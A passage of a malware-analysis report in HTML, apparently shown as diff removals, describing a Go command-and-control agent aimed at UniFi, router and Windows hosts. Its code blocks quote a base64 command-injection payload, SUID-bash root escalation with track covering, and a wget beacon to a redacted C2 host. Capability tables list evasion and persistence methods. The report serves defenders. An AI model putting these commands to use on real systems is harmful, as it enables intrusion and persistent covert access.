-<span class="muted"># Payload delivery — base64-encoded shell command:</span>
-b64 = base64.b64encode(cmd.encode()).decode()
-payload = <span class="fn">f</span><span class="st">">/dev/null 2>&1 || true ; echo {b64} | base64 -d | sh ;"</span>
-path = <span class="fn">f</span><span class="st">"{BYPATH}?pkg_name={quote(payload)}&by_cmd=true"</span>
-
-<span class="muted"># Unauthenticated GET to HTTPS:443 → root RCE</span>
-<span class="muted"># Timing oracle for blind verification: sleep {N}s delay → elapsed > N-0.5</span></code></pre>
-
-<h3>Privilege Escalation + Deployment</h3>
-<pre><code><span class="muted"># Escalation via passwordless sudo (observed in deploy logs)</span>
-sudo -n chmod 4755 /bin/bash   <span class="muted"># SUID bash</span>
-bash -p -c <span class="st">'&lt;command&gt;'</span>         <span class="muted"># execute as root</span>
-sudo -n chmod 0755 /bin/bash   <span class="muted"># restore (cover tracks)</span>
-
-<span class="muted"># Agent masquerade on UniFi devices:</span>
-AGENT_PATH = <span class="st">"/usr/local/bin/.uniFi-core"</span>   <span class="muted"># hidden, mimics legitimate binary</span>
-SVC_NAME   = <span class="st">"uniFi-core"</span>                   <span class="muted"># systemd service impersonation</span>
-
-<span class="muted"># Heartbeat — every 10 minutes via cron:</span>
-wget -qO /dev/null <span class="st">"http://[redacted]:8443/beacon?host=$(hostname)&arch=$(uname -m)&id=..."</span></code></pre>
-
-<h3>Agent Architecture Coverage</h3>
-<div class="tbl-wrap">
-<table>
-  <thead><tr><th>Binary</th><th>Architecture</th><th>Primary Targets</th></tr></thead>
-  <tbody>
-    <tr><td class="mono">agent_linux_amd64</td><td>x86-64</td><td>UniFi on x86 servers, general Linux</td></tr>
-    <tr><td class="mono">agent_linux_arm64</td><td>AArch64</td><td>UniFi Dream Machine, UDM-Pro, Dream Router, UDR</td></tr>
-    <tr><td class="mono">agent_linux_arm5/7</td><td>ARMv5/v7</td><td>Older routers, embedded Linux</td></tr>
-    <tr><td class="mono">agent_linux_mips/mipsle</td><td>MIPS BE/LE</td><td>D-Link, TP-Link, Netgear legacy</td></tr>
-    <tr><td class="mono">agent_linux_mips64/64le</td><td>MIPS64</td><td>Enterprise networking equipment</td></tr>
-    <tr><td class="mono">agent_linux_ppc64/ppc64le</td><td>PowerPC 64</td><td>IBM embedded, older enterprise</td></tr>
-    <tr><td class="mono">agent_linux_riscv64</td><td>RISC-V 64</td><td>Emerging embedded Linux platforms</td></tr>
-    <tr><td class="mono red-text">agent_linux_loong64</td><td>LoongArch 64</td><td class="red-text">PRC-manufactured hardware (Loongson CPUs)</td></tr>
-    <tr><td class="mono">agent_windows_amd64.exe</td><td>x86-64 PE</td><td>Windows servers and workstations</td></tr>
-    <tr><td class="mono">dbusd_mipsbe/mipsle</td><td>MIPS</td><td>D-Link, consumer routers (dbus masquerade)</td></tr>
-    <tr><td class="mono">dbusd_arm/aarch64</td><td>ARM/AArch64</td><td>ARM IoT devices (DIR-868L, etc.)</td></tr>
-    <tr><td class="mono">dbusd_x86_64</td><td>x86-64</td><td>x86 IoT, normal C2 port</td></tr>
-    <tr><td class="mono">dbusd_x86_64_443</td><td>x86-64</td><td>x86 IoT variant, port 443 C2</td></tr>
-  </tbody>
-</table>
-</div>
-
-<!-- 05 BINARY ANALYSIS -->
-<h2 id="binary">05. Agent-TCP Binary Analysis — Unpacked</h2>
-
-<p>Both agent binaries (<code>agent_linux_amd64</code> unpacked: 6.57 MB; <code>agent_windows_amd64.exe</code> unpacked: 6.81 MB) were analyzed post-UPX decompression. Build flags <code>-ldflags="-s -w"</code> strip symbols, but Go module metadata, type strings, and internal package paths survive in the binary. The following capabilities were extracted directly from string analysis of the unpacked binaries.</p>
-
-<div class="callout-blue">
-  <p><strong>Architectural note — agent vs. exploit chain:</strong> Agent-TCP is a <em>post-exploitation C2 agent</em>, not a scanner or exploiter. It contains no built-in port scanning, CVE exploit code, or credential spraying. Initial access (WordPress REST API abuse, IoT CVEs) is performed by separate scripts recovered from the open directory staging server. Once deployed, the agent receives operator commands over <code>v9g6.my:443</code> — any further scanning or lateral movement is executed remotely by the operator via <code>handleExec</code> / <code>handleMemExec</code> (fileless payload staging) and <code>handleSOCKS5</code> (network pivoting), not by autonomous agent logic.</p>
-</div>
-
-<h3>Build Metadata</h3>
-<div class="tbl-wrap">
-<table>
-  <thead><tr><th>Field</th><th>Value</th><th>Significance</th></tr></thead>
-  <tbody>
-    <tr><td>Module path</td><td class="mono">agent</td><td>Internal module name, no public registry</td></tr>
-    <tr><td>Version</td><td class="mono">v0.0.0-20260703114451-ccc2d93ad4e3+dirty</td><td>Commit hash + dirty flag = active development</td></tr>
-    <tr><td>Go version</td><td class="mono">go1.26.4</td><td>Released ~2026, current at compile time</td></tr>
-    <tr><td class="strong red-text">Build path</td><td class="mono red-text">D:/BIN_Research/Knowledge/Defense-Evasion/go-agent-tcp</td><td class="red-text">Operator dev machine: Windows (D: drive), deliberately organized under "Defense-Evasion"</td></tr>
-    <tr><td>Internal packages</td><td class="mono">agent/internal/handler, agent/internal/protocol</td><td>Structured handler and protocol layers</td></tr>
-    <tr><td>Linux SHA256</td><td class="mono" style="font-size:10px;">9c285fe3a491ee6a6f872ae71d47dfe29e44a40b9e7fcba85a39a2368584333a</td><td>Packed binary</td></tr>
-    <tr><td>Windows SHA256</td><td class="mono" style="font-size:10px;">4ff527e0d8fc36a99a491bc69a9cabeb055a4be470e22ec3da8e8bb741be9efc</td><td>Packed binary</td></tr>
-  </tbody>
-</table>
-</div>
-
-<h3>Agent-TCP — Platform Capability Map</h3>
-
-<div class="diagram-wrap">
-<svg viewBox="0 0 800 358" width="800" height="358" xmlns="http://www.w3.org/2000/svg" style="background:#0d1117;border:1px solid #21262d;border-radius:8px;">
-  <defs>
-    <marker id="ac" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0 0,8 3,0 6" fill="#484f58"/></marker>
-    <marker id="acb" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0 0,8 3,0 6" fill="#3b82f6"/></marker>
-  </defs>
-
-  <!-- ─── Column headers ─────────────────────────────────────────────────── -->
-  <text x="90" y="18" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" font-weight="700" fill="#8b949e" letter-spacing="2">LINUX ELF</text>
-  <text x="400" y="18" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" font-weight="700" fill="#ff4444" letter-spacing="2">AGENT-TCP CORE</text>
-  <text x="710" y="18" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" font-weight="700" fill="#8b949e" letter-spacing="2">WINDOWS PE</text>
-
-  <!-- ─── Core agent box: x=310 y=126 w=180 h=72 ───────────────────────── -->
-  <!-- center=(400,162), midL=(310,162), midR=(490,162), midB=(400,198) -->
-  <rect x="310" y="126" width="180" height="72" rx="7" fill="#1a0a0a" stroke="#ff4444" stroke-width="2"/>
-  <text x="400" y="153" text-anchor="middle" font-family="'Courier New',monospace" font-size="13" font-weight="700" fill="#ff4444">AGENT-TCP</text>
-  <text x="400" y="170" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#8b949e">Go 1.26.4 · UPX 4.22</text>
-  <text x="400" y="186" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#484f58">ccc2d93ad4e34c246...+dirty</text>
-
-  <!-- ─── Linux boxes (x=10, w=172, h=40) ──────────────────────────────── -->
-  <!-- L1: MemfdCreate — y=28, midR=(182,48), line → (310,140) -->
-  <rect x="10" y="28" width="172" height="40" rx="5" fill="#0a1a0a" stroke="#22c55e" stroke-width="1.2"/>
-  <text x="96" y="47" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" font-weight="700" fill="#22c55e">MemfdCreate</text>
-  <text x="96" y="60" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">fileless in-memory exec · mmap</text>
-  <line x1="182" y1="48" x2="302" y2="140" stroke="#484f58" stroke-width="1.1" marker-end="url(#ac)"/>
-
-  <!-- L2: Systemd — y=82, midR=(182,102), line → (310,150) -->
-  <rect x="10" y="82" width="172" height="40" rx="5" fill="#111" stroke="#f97316" stroke-width="1.2"/>
-  <text x="96" y="100" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" font-weight="700" fill="#f97316">Systemd + SysV Persist</text>
-  <text x="96" y="113" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">Systemd svc · SysV init</text>
-  <line x1="182" y1="102" x2="302" y2="150" stroke="#484f58" stroke-width="1.1" marker-end="url(#ac)"/>
-
-  <!-- L3: Self-delete — y=136, midR=(182,156), line → (310,162) -->
-  <rect x="10" y="136" width="172" height="40" rx="5" fill="#111" stroke="#ff4444" stroke-width="1.2"/>
-  <text x="96" y="154" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" font-weight="700" fill="#ff4444">Self-Delete + Cleanup</text>
-  <text x="96" y="167" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">selfDelete · cleanArtifacts</text>
-  <line x1="182" y1="156" x2="302" y2="162" stroke="#484f58" stroke-width="1.1" marker-end="url(#ac)"/>
-
-  <!-- L4: Argv spoof — y=190, midR=(182,210), line → (310,172) -->
-  <rect x="10" y="190" width="172" height="40" rx="5" fill="#100a1a" stroke="#a855f7" stroke-width="1.2"/>
-  <text x="96" y="208" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" font-weight="700" fill="#a855f7">Argv + prctl Spoof</text>
-  <text x="96" y="221" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">spoofArgv · prctl · daemonize</text>
-  <line x1="182" y1="210" x2="302" y2="174" stroke="#484f58" stroke-width="1.1" marker-end="url(#ac)"/>
-
-  <!-- L5: SRX320 — y=244, midR=(182,264), line → (310,183) -->
-  <rect x="10" y="244" width="172" height="40" rx="5" fill="#100a1a" stroke="#a855f7" stroke-width="1.2"/>
-  <text x="96" y="262" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" font-weight="700" fill="#a855f7">Juniper SRX320 Exec</text>
-  <text x="96" y="275" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">raw exec · #!/bin/sh fallback</text>
-  <line x1="182" y1="264" x2="302" y2="183" stroke="#484f58" stroke-width="1.1" stroke-dasharray="4,3" marker-end="url(#ac)"/>
-
-  <!-- ─── Windows boxes (x=618, w=172, h=40) ───────────────────────────── -->
-  <!-- R1: DLL inject — y=28, midL=(618,48), line ← (490,140) -->
-  <rect x="618" y="28" width="172" height="40" rx="5" fill="#0a1a0a" stroke="#22c55e" stroke-width="1.2"/>
-  <text x="704" y="47" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" font-weight="700" fill="#22c55e">DLL Injection</text>
-  <text x="704" y="60" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">LoadLibraryEx · RemoteThread</text>
-  <line x1="498" y1="140" x2="610" y2="48" stroke="#484f58" stroke-width="1.1" marker-end="url(#ac)"/>
-
-  <!-- R2: Registry — y=82, midL=(618,102), line ← (490,150) -->
-  <rect x="618" y="82" width="172" height="40" rx="5" fill="#111" stroke="#f97316" stroke-width="1.2"/>
-  <text x="704" y="100" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" font-weight="700" fill="#f97316">Registry Access</text>
-  <text x="704" y="113" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">RegOpenKeyEx · RegQueryValueEx</text>
-  <line x1="498" y1="150" x2="610" y2="102" stroke="#484f58" stroke-width="1.1" marker-end="url(#ac)"/>
-
-  <!-- R3: Self-delete — y=136, midL=(618,156), line ← (490,162) -->
-  <rect x="618" y="136" width="172" height="40" rx="5" fill="#111" stroke="#ff4444" stroke-width="1.2"/>
-  <text x="704" y="154" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" font-weight="700" fill="#ff4444">Self-Delete</text>
-  <text x="704" y="167" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">selfDeleteWindows · CreateFile</text>
-  <line x1="498" y1="162" x2="610" y2="156" stroke="#484f58" stroke-width="1.1" marker-end="url(#ac)"/>
-
-  <!-- R4: IFEO + ConPTY — y=190, midL=(618,210), line ← (490,172) -->
-  <rect x="618" y="190" width="172" height="40" rx="5" fill="#100a1a" stroke="#a855f7" stroke-width="1.2"/>
-  <text x="704" y="208" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" font-weight="700" fill="#a855f7">IFEO + ConPTY Shell</text>
-  <text x="704" y="221" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">disguiseIFEO · CreatePseudoConsole</text>
-  <line x1="498" y1="172" x2="610" y2="210" stroke="#484f58" stroke-width="1.1" marker-end="url(#ac)"/>
-
-  <!-- R5: Token — y=244, midL=(618,264), line ← (490,183) -->
-  <rect x="618" y="244" width="172" height="40" rx="5" fill="#111" stroke="#a855f7" stroke-width="1.2"/>
-  <text x="704" y="262" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" font-weight="700" fill="#a855f7">Token Impersonation</text>
-  <text x="704" y="275" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">CreateProcessAsUser · SysProcAttr</text>
-  <line x1="498" y1="183" x2="610" y2="264" stroke="#484f58" stroke-width="1.1" stroke-dasharray="4,3" marker-end="url(#ac)"/>
-
-  <!-- ─── Shared C2 strip at bottom ─────────────────────────────────────── -->
-  <rect x="276" y="214" width="248" height="36" rx="5" fill="#0a0f1a" stroke="#3b82f6" stroke-width="1.4"/>
-  <text x="400" y="232" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" font-weight="700" fill="#3b82f6">ChaCha20Poly1305 · TLS 1.3 · MLKEM · HTTP/2</text>
-  <text x="400" y="244" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">handleSOCKS5 · handleUpload · handleMemExec</text>
-  <line x1="400" y1="214" x2="400" y2="200" stroke="#3b82f6" stroke-width="1.2" marker-end="url(#acb)"/>
-
-  <!-- ─── Shared artifacts strip ─────────────────────────────────────────── -->
-  <rect x="276" y="264" width="248" height="40" rx="4" fill="#0f1117" stroke="#21262d" stroke-width="1"/>
-  <text x="400" y="278" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">~/.p2p/peer_id · collectInternetIP</text>
-  <text x="400" y="292" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">/proc/self/cgroup · container detect</text>
-
-  <!-- ─── SOCKS5 box below shared strip ─────────────────────────────────── -->
-  <rect x="276" y="312" width="248" height="36" rx="4" fill="#111" stroke="#484f58" stroke-width="1"/>
-  <text x="400" y="327" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#8b949e">SOCKS5 · exec · upload · heartbeat</text>
-  <text x="400" y="341" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">self-destruct · file list · download</text>
-</svg>
-</div>
-
-<h3>Capability Inventory — Extracted from Binary</h3>
-
-<div class="tbl-wrap">
-<table>
-  <thead><tr><th>Capability</th><th>Evidence (Symbol / String)</th><th>Platform</th><th>Severity</th></tr></thead>
-  <tbody>
-    <tr>
-      <td class="strong">In-Memory Fileless Execution</td>
-      <td class="mono">unix.MemfdCreate, mmap, mremap, munmap</td>
-      <td>Linux</td>
-      <td><span class="pill p-red">CRITICAL</span></td>
-    </tr>
-    <tr>
-      <td class="strong">DLL Injection</td>
-      <td class="mono">LoadLibraryEx, GetProcAddress, loadlibrary, getprocaddress</td>
-      <td>Windows</td>
-      <td><span class="pill p-red">CRITICAL</span></td>
-    </tr>
-    <tr>
-      <td class="strong">Juniper SRX320 Exec</td>
-      <td class="mono">falling back to SRX320 raw exec: %q#!/bin/sh</td>
-      <td>Linux/embedded</td>
-      <td><span class="pill p-red">CRITICAL</span></td>
-    </tr>
-    <tr>
-      <td class="strong">Post-Quantum TLS (MLKEM)</td>
-      <td class="mono">mlkemCiphertextSize, mlkem.encryptionKey, tlsmlkem flag</td>
-      <td>Both</td>
-      <td><span class="pill p-orange">HIGH</span></td>
-    </tr>
-    <tr>
-      <td class="strong">Encrypted C2 (AEAD)</td>
-      <td class="mono">chacha20poly1305.chacha20Poly1305Seal/Open, poly1305, hkdf</td>
-      <td>Both</td>
-      <td><span class="pill p-red">CRITICAL</span></td>
-    </tr>
-    <tr>
-      <td class="strong">File Upload / Exfiltration</td>
-      <td class="mono">handler.handleUpload, protocol.UploadData, protocol.UploadReqData</td>
-      <td>Both</td>
-      <td><span class="pill p-red">CRITICAL</span></td>
-    </tr>
-    <tr>
-      <td class="strong">Self-Deletion</td>
-      <td class="mono">handler.selfDeleteLinux, handler.selfDeleteWindows, os.Remove, Fchmod</td>
-      <td>Both</td>
-      <td><span class="pill p-orange">HIGH</span></td>
-    </tr>
-    <tr>
-      <td class="strong">Systemd User Persistence</td>
-      <td class="mono">handler.installSystemdUserService</td>
-      <td>Linux</td>
-      <td><span class="pill p-orange">HIGH</span></td>
-    </tr>
-    <tr>
-      <td class="strong">SOCKS5 Proxy</td>
-      <td class="mono">handleProxyStart, handleProxyStop, handleSOCKS5, ProxyConfig, ProxyStartReqData</td>
-      <td>Both</td>
-      <td><span class="pill p-red">CRITICAL</span></td>
-    </tr>
-    <tr>
-      <td class="strong">ConPTY Interactive Shell (Windows)</td>
-      <td class="mono">CreatePseudoConsole, ResizePseudoConsole, DisconnectNamedPipe</td>
-      <td>Windows</td>
-      <td><span class="pill p-red">CRITICAL</span></td>
-    </tr>
-    <tr>
-      <td class="strong">IFEO Registry Hijack (Windows)</td>
-      <td class="mono">disguiseIFEO, Image File Execution Options\, GetCurrentProcessPath, DisguiseProcessName</td>
-      <td>Windows</td>
-      <td><span class="pill p-red">CRITICAL</span></td>
-    </tr>
-    <tr>
-      <td class="strong">Double Argv Spoof (Linux)</td>
-      <td class="mono">prctl PR_SET_NAME, spoofArgv, DisguiseProcessNameLinux, disguiseProcess, cleanEnv</td>
-      <td>Linux</td>
-      <td><span class="pill p-red">CRITICAL</span></td>
-    </tr>
-    <tr>
-      <td class="strong">File Download (C2 → Target)</td>
-      <td class="mono">handleDownload, DownloadData, DownloadReqData, json:"gzip"</td>
-      <td>Both</td>
-      <td><span class="pill p-orange">HIGH</span></td>
-    </tr>
-    <tr>
-      <td class="strong">Directory Listing</td>
-      <td class="mono">handleFileList, FileListReqData</td>
-      <td>Both</td>
-      <td><span class="pill p-orange">HIGH</span></td>
-    </tr>
-    <tr>
-      <td class="strong">Process Enumeration (Windows)</td>
-      <td class="mono">Module32NextW, Thread32First, EnumProcesses</td>
-      <td>Windows</td>
-      <td><span class="pill p-orange">HIGH</span></td>
-    </tr>
-    <tr>
-      <td class="strong">Daemonize (Linux)</td>
-      <td class="mono">main.daemonize — fork/setsid, detach from tty</td>
-      <td>Linux</td>
-      <td><span class="pill p-orange">HIGH</span></td>
-    </tr>
-    <tr>
-      <td class="strong">SysV Init Persistence</td>
-      <td class="mono">installSysVInit (in addition to systemd)</td>
-      <td>Linux</td>
-      <td><span class="pill p-orange">HIGH</span></td>
-    </tr>
-    <tr>
-      <td class="strong">libp2p P2P Channel</td>
-      <td class="mono">collectLibp2pPeerID, ~/.p2p/peer_id, \.p2p\peer_id</td>
-      <td>Both</td>
-      <td><span class="pill p-orange">HIGH</span></td>
-    </tr>
-    <tr>
-      <td class="strong">External IP Enumeration</td>
-      <td class="mono">collectInternetIP — 5 geo-IP services queried in parallel goroutines</td>
-      <td>Both</td>
-      <td><span class="pill p-orange">HIGH</span></td>
-    </tr>
-    <tr>
-      <td class="strong">Host Profiling</td>
-      <td class="mono">collectCPUArch/Info/Usage, collectUsername, wmicValue (WMIC queries), /sys/class/dmi/id/chassis_type</td>
-      <td>Both</td>
-      <td><span class="pill p-orange">HIGH</span></td>
-    </tr>
-    <tr>
-      <td class="strong">Container Detection</td>
-      <td class="mono">/proc/self/cgroup, /proc/self/auxv, /proc/self/gid_map</td>
-      <td>Linux</td>
-      <td><span class="pill p-orange">HIGH</span></td>
-    </tr>
-    <tr>
-      <td class="strong">Ordered Cleanup</td>
-      <td class="mono">cleanupPersistenceArtifacts → selfDelete (ordered, not immediate)</td>
-      <td>Both</td>
-      <td><span class="pill p-orange">HIGH</span></td>
-    </tr>
-    <tr>
-      <td class="strong">Anti-Debug (Ptrace)</td>
-      <td class="mono">runtime.pTraceState, Ptrace, sleepController, sleepRatio</td>
-      <td>Linux</td>
-      <td><span class="pill p-yellow">MEDIUM</span></td>
-    </tr>
-    <tr>
-      <td class="strong">HTTP/2 + HPACK C2</td>
-      <td class="mono">net/http2/hpack, AppendHuffmanString, NewDecoder/Encoder</td>
-      <td>Both</td>
-      <td><span class="pill p-yellow">MEDIUM</span></td>
-    </tr>
-    <tr>
-      <td class="strong">Windows Registry Access</td>
-      <td class="mono">RegOpenKeyEx, RegQueryValueEx, \\MVT, \\System</td>
-      <td>Windows</td>
-      <td><span class="pill p-orange">HIGH</span></td>
-    </tr>
-  </tbody>
-</table>
-</div>
-
-<div class="callout-blue">
-  <p><strong>MemfdCreate analysis:</strong> The Linux variant calls <code>unix.MemfdCreate</code> to create an anonymous in-memory file descriptor, writes payload to it, and executes it via <code>/proc/self/fd/N</code> — no disk write occurs. Combined with the self-delete function, successful execution leaves zero persistent artifacts on disk. Standard file-based forensics will find nothing.</p>
-</div>
-
-<div class="callout-purple">
-  <p><strong>Post-quantum TLS:</strong> MLKEM (Module Lattice Key Encapsulation Mechanism, formerly Kyber) is present in the TLS stack — unusual for commodity malware. The <code>tlsmlkem</code> build debug flag confirms this was explicitly configured, not an incidental dependency.</p>
-</div>
-
-<h3>C2 Protocol Stack</h3>
-
-<div class="diagram-wrap">
-<svg viewBox="0 0 760 252" width="760" height="252" xmlns="http://www.w3.org/2000/svg" style="background:#0d1117;border:1px solid #21262d;border-radius:8px;">
-  <defs>
-    <marker id="apr" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0 0,8 3,0 6" fill="#3b82f6"/></marker>
-    <marker id="apg" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0 0,8 3,0 6" fill="#22c55e"/></marker>
-  </defs>
-
-  <!-- ─── Band backgrounds ──────────────────────────────────────────────── -->
-  <!-- Band 1: TRANSPORT y=8..61 -->
-  <rect x="0" y="8" width="760" height="53" rx="0" fill="#0a0f1a" opacity="0.6"/>
-  <!-- Band 2: KEY EXCHANGE y=69..122 -->
-  <rect x="0" y="69" width="760" height="53" rx="0" fill="#0a1a0a" opacity="0.5"/>
-  <!-- Band 3: ENCRYPTION y=130..183 -->
-  <rect x="0" y="130" width="760" height="53" rx="0" fill="#1a0a0a" opacity="0.5"/>
-  <!-- Band 4: PAYLOAD y=191..244 -->
-  <rect x="0" y="191" width="760" height="53" rx="0" fill="#0f1117" opacity="0.8"/>
-
-  <!-- Band dividers -->
-  <line x1="0" y1="62" x2="760" y2="62" stroke="#21262d" stroke-width="1"/>
-  <line x1="0" y1="123" x2="760" y2="123" stroke="#21262d" stroke-width="1"/>
-  <line x1="0" y1="184" x2="760" y2="184" stroke="#21262d" stroke-width="1"/>
-
-  <!-- Left label column divider -->
-  <line x1="78" y1="8" x2="78" y2="252" stroke="#21262d" stroke-width="1"/>
-
-  <!-- Band labels (left column, vertically centered) -->
-  <text x="39" y="35" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" font-weight="700" fill="#3b82f6" letter-spacing="1">TRANSPORT</text>
-  <text x="39" y="97" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" font-weight="700" fill="#22c55e" letter-spacing="1">KEY EXCH</text>
-  <text x="39" y="154" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" font-weight="700" fill="#ff4444" letter-spacing="1">ENCRYPT</text>
-  <text x="39" y="214" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" font-weight="700" fill="#8b949e" letter-spacing="1">PAYLOAD</text>
-
-  <!-- ─── Band 1: Transport chain ────────────────────────────────────────── -->
-  <!-- TCP :443  x=88 w=76 mid-y=34 midR=(164,34) -->
-  <rect x="88" y="15" width="76" height="38" rx="5" fill="#0a0f1a" stroke="#3b82f6" stroke-width="1.2"/>
-  <text x="126" y="33" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" fill="#3b82f6">TCP</text>
-  <text x="126" y="47" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">port :443</text>
-  <line x1="164" y1="34" x2="177" y2="34" stroke="#3b82f6" stroke-width="1.2" marker-end="url(#apr)"/>
-
-  <!-- TLS 1.3 + ECH  x=179 w=128 midR=(307,34) -->
-  <rect x="179" y="15" width="128" height="38" rx="5" fill="#0a0f1a" stroke="#3b82f6" stroke-width="1.4"/>
-  <text x="243" y="33" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" fill="#3b82f6">TLS 1.3 + ECH</text>
-  <text x="243" y="47" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">ALPN: h2 · SNI obfusc.</text>
-  <line x1="307" y1="34" x2="320" y2="34" stroke="#3b82f6" stroke-width="1.2" marker-end="url(#apr)"/>
-
-  <!-- HTTP/2 HPACK  x=322 w=120 midR=(442,34) -->
-  <rect x="322" y="15" width="120" height="38" rx="5" fill="#0a0f1a" stroke="#3b82f6" stroke-width="1.4"/>
-  <text x="382" y="33" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" fill="#3b82f6">HTTP/2 · HPACK</text>
-  <text x="382" y="47" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">header compression</text>
-  <line x1="442" y1="34" x2="455" y2="34" stroke="#3b82f6" stroke-width="1.2" marker-end="url(#apr)"/>
-
-  <!-- ChaCha20 framing  x=457 w=174 midR=(631,34) -->
-  <rect x="457" y="15" width="174" height="38" rx="5" fill="#1a0505" stroke="#ff4444" stroke-width="1.6"/>
-  <text x="544" y="33" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" font-weight="700" fill="#ff4444">ChaCha20Poly1305 AEAD</text>
-  <text x="544" y="47" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">16-byte auth token · TaskID UUID</text>
-  <line x1="631" y1="34" x2="644" y2="34" stroke="#a855f7" stroke-width="1.2" marker-end="url(#apr)"/>
-
-  <!-- C2 server  x=646 w=104 -->
-  <rect x="646" y="15" width="104" height="38" rx="5" fill="#0a0a1a" stroke="#a855f7" stroke-width="1.4"/>
-  <text x="698" y="33" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" fill="#a855f7">v9g6.my:443</text>
-  <text x="698" y="47" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">obfs domain (CRC32)</text>
-
-  <!-- ─── Band 2: Key Exchange chain ────────────────────────────────────── -->
-  <!-- RSA KEX  x=88 w=120 midR=(208,95) -->
-  <rect x="88" y="75" width="120" height="38" rx="5" fill="#0a1a0a" stroke="#22c55e" stroke-width="1.2"/>
-  <text x="148" y="92" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" fill="#22c55e">RSA Key Exchange</text>
-  <text x="148" y="106" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">asymmetric bootstrap</text>
-  <line x1="208" y1="94" x2="221" y2="94" stroke="#22c55e" stroke-width="1.2" marker-end="url(#apg)"/>
-
-  <!-- HKDF  x=223 w=148 midR=(371,94) -->
-  <rect x="223" y="75" width="148" height="38" rx="5" fill="#0a1a0a" stroke="#22c55e" stroke-width="1.2"/>
-  <text x="297" y="92" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" fill="#22c55e">HKDF Session Keys</text>
-  <text x="297" y="106" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">derived per-session symm. keys</text>
-  <line x1="371" y1="94" x2="384" y2="94" stroke="#22c55e" stroke-width="1.2" marker-end="url(#apg)"/>
-
-  <!-- MLKEM  x=386 w=196 midR=(582,94) -->
-  <rect x="386" y="75" width="196" height="38" rx="5" fill="#0a1a0a" stroke="#22c55e" stroke-width="1.4"/>
-  <text x="484" y="92" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" font-weight="700" fill="#22c55e">MLKEM768-P256 / MLKEM1024-P384</text>
-  <text x="484" y="106" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">post-quantum hybrid KEM (FIPS 140)</text>
-  <line x1="582" y1="94" x2="595" y2="94" stroke="#22c55e" stroke-width="1.2" marker-end="url(#apg)"/>
-
-  <!-- AES-GCM fallback  x=597 w=153 -->
-  <rect x="597" y="75" width="153" height="38" rx="5" fill="#111" stroke="#484f58" stroke-width="1.2"/>
-  <text x="673" y="92" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" fill="#8b949e">AES-GCM fallback</text>
-  <text x="673" y="106" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">AES-CBC/CTR · RC4 legacy</text>
-
-  <!-- ─── Band 3: Encryption details ────────────────────────────────────── -->
-  <!-- Primary (large) x=88 w=374 -->
-  <rect x="88" y="136" width="374" height="38" rx="5" fill="#1a0505" stroke="#ff4444" stroke-width="1.6"/>
-  <text x="275" y="153" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" font-weight="700" fill="#ff4444">PRIMARY: ChaCha20Poly1305</text>
-  <text x="275" y="167" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#8b949e">golang.org/x/crypto/chacha20poly1305 · AEAD · authenticated encryption</text>
-
-  <!-- Divider between primary and fallback -->
-  <line x1="470" y1="136" x2="470" y2="174" stroke="#21262d" stroke-width="1"/>
-  <text x="473" y="151" font-family="'Courier New',monospace" font-size="8" fill="#484f58">FALLBACK</text>
-
-  <!-- Fallback x=472 w=278 -->
